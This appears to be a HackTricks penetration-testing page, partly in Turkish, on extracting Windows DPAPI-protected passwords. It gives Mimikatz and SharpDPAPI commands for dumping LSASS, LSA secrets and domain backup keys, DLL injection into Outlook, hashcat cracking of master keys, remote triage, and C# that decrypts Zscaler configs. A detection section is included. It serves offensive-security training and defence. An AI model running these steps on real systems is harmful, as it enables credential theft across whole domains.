# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI Nedir

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Kullanıcı anahtarının oluşturulması

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. This key is derived from the user's password and other factors and the algorithm depends on the type of user but ends being a SHA1. For example, for domain users, **it depends on the NTLM hash of the user**.

This is specially interesting because if an attacker can obtain the user's password hash, they can:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Moreover, every time some data is encrypted by a user using DPAPI, a new **master key** is generated. This master key is the one actually used to encrypt data. Each master key is given with a **GUID** (Globally Unique Identifier) that identifies it.

The master keys are stored in the **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, where `{SID}` is the Security Identifier of that user. The master key is stored encrypted by the user's **`pre-key`** and also by a **domain backup key** for recovery (so the same key is stored encrypted 2 times by 2 different pass).

Note that the **domain key used to encrypt the master key is in the domain controllers and never changes**, so if an attacker has access to the domain controller, they can retrieve the domain backup key and decrypt the master keys of all users in the domain.

The encrypted blobs contain the **GUID of the master key** that was used to encrypt the data inside its headers.

> [!TIP]
> DPAPI ile şifrelenmiş blob'lar **`01 00 00 00`** ile başlar

Master key'leri bulun:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI master keys'lerini ve SYSTEM key'ini çıkarmak için **LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Eğer kullanıcının yerel yönetici ayrıcalıkları varsa, makine master anahtarlarını deşifre etmek için **DPAPI_SYSTEM LSA secret**'e erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Eğer kullanıcının password veya NTLM hash'i biliniyorsa, **decrypt the master keys of the user directly** yapabilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Eğer kullanıcı olarak bir oturum içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** isteyebilirsiniz. Eğer local admin iseniz ve kullanıcı oturum açmışsa, bunun için **steal his session token** elde edebilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ı Listele
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilere Erişim

### DPAPI Şifrelenmiş verileri bulma

Kullanıcıların yaygın olarak **korunan dosyaları** şunlardır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ayrıca yukarıdaki yollarda `\Roaming\` yerine `\Local\` değiştirmeyi de kontrol edin.

Enumeration örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) dosya sisteminde, kayıt defterinde ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Şunu unutmayın: [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repo'dan) DPAPI kullanılarak cookies gibi hassas verileri decrypt etmek için kullanılabilir.

### Erişim anahtarları ve veriler

- **SharpDPAPI'yi kullanın** mevcut oturumdan DPAPI ile şifrelenmiş dosyalardan credentials almak için:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Credentials ile ilgili bilgileri al**: şifrelenmiş veriler ve guidMasterKey gibi.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Masterkeys'e erişim**:

RPC kullanarak **domain backup key** talep eden bir kullanıcının masterkey'ini deşifre edin:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı ayrıca masterkey şifre çözümü için şu argümanları destekler (domain yedek anahtarını almak için `/rpc` kullanmak, düz metin bir parola kullanmak için `/password`, veya bir DPAPI domain özel anahtar dosyası belirtmek için `/pvk` kullanmak mümkün...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Bir masterkey kullanarak verileri çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için şu argümanları destekler (örneğin `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak, `/pvk` ile bir DPAPI domain private key dosyası belirtmek, `/unprotect` ile mevcut kullanıcının oturumunu kullanmak mümkündür...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Bazı verileri **current user session** kullanarak şifre çöz:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Opsiyonel Entropi ile Başetme ("Third-party entropy")

Bazı uygulamalar `CryptProtectData`'ya ek bir **entropi** değeri geçirir. Bu değer olmadan blob deşifre edilemez, doğru masterkey bilinse bile. Bu şekilde korunan kimlik bilgilerini hedeflerken entropiyi elde etmek bu nedenle esastır (örn. Microsoft Outlook, bazı VPN istemcileri).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI işlevlerine hook yapan bir user-mode DLL'dir ve sağlanan herhangi bir opsiyonel entropiyi şeffaf biçimde kaydeder. EntropyCapture'ı **DLL-injection** modunda `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı çalıştırmak, her entropi tamponunu çağıran süreç ve blob ile eşleyen bir dosya çıktısı üretir. Yakalanan entropi daha sonra veriyi deşifre etmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`)'e sağlanabilir.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkey'leri çevrimdışı kırma (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile başlayan sürümlerde **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (December 2023) hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) ekledi; bu, masterkey dosyasından doğrudan kullanıcı parolalarının GPU hızlandırmalı kırılmasına izin veriyor. Bu nedenle saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.

`DPAPISnoop` (2024) süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential and Vault blobs'larını ayrıştırabilir, cracked keys ile bunları çözerek cleartext passwords olarak dışa aktarabilir.

### Diğer makinedeki verilere erişim

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Elbette o makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key is known** kabul edilmiştir:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıların ve bilgisayarların çıkarılmasını ve RPC üzerinden domain controller yedek anahtarının çıkarılmasını otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm bilgisayarlarda smbclient çalıştırarak tüm kullanıcıların DPAPI blob'larını alır ve domain yedek anahtarı ile her şeyi çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılan bilgisayar listesiyle, bilmediğiniz alt ağların her birini bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI ile korunmuş gizli verileri otomatik olarak dökebilir. 2.x sürümü şunları getirdi:

* Yüzlerce host'tan blob'ların paralel toplanması
* **context 3** masterkey'lerin ayrıştırılması ve otomatik Hashcat kırma entegrasyonu
* Chrome "App-Bound" şifrelenmiş çerezleri için destek (bir sonraki bölüme bakınız)
* Yeni bir **`--snapshot`** modu: uç noktaları tekrar tekrar sorgulayıp yeni oluşturulan blob'ları diff'ler

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyalarını ayrıştıran bir C# parser'dır; Hashcat/JtR formatları üretebilir ve isteğe bağlı olarak kırma işlemini otomatik başlatabilir. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tam olarak destekler.


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilgili dizinlerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından erişim.
- **Mimikatz**, **SharpDPAPI** veya benzeri araçların LSASS belleğine erişim veya masterkey'leri dökme amacıyla kullanılması.
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** nesnesine erişim ile korelasyon gösterilebilir.
- Event **4673/4674**: bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde


---
### 2023-2025 güvenlik açıkları & ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü amaçlı bir DPAPI yedek anahtarı almaya kandırarak kullanıcı masterkey'lerinin şifresini çözebiliyordu. Kasım 2023 toplu güncellemesinde yamalandı — yöneticiler DC'lerin ve iş istasyonlarının tam olarak güncellenmiş olduğundan emin olmalıdır.
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eskiden sadece DPAPI ile sağlanan korumayı, kullanıcının **Credential Manager** altında saklanan ek bir anahtarla güçlendirdi. Çerezlerin çevrimdışı çözülmesi artık hem DPAPI masterkey'ini hem de **GCM-wrapped app-bound key**'i gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldığında ekstra anahtarı kurtarabiliyorlar.


### Vaka İncelemesi: Zscaler Client Connector – SID'den Türeyen Özel Entropy

Zscaler Client Connector `C:\ProgramData\Zscaler` altında birkaç konfigürasyon dosyası saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir, ancak vendor diskte saklamak yerine *çalışma zamanında hesaplanan* **özel entropy** sağlar.

Entropy iki unsurdan yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içinde gömülü sabit bir gizli değer.
2. Konfigürasyonun ait olduğu Windows hesabının **SID**'i.

DLL tarafından uygulanan algoritma eşdeğeridir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Sır diskte okunabilen bir DLL'e gömülü olduğu için, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden oluşturabilir** ve blob'ları çevrimdışı olarak çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren tam JSON yapılandırmasını ortaya çıkarır — istemci tarafı bypasses denenirken çok değerli bir bilgidir.

> İPUCU: diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropi olmadan** (`16` sıfır bayt) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan çözülebilirler.

## Referanslar

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
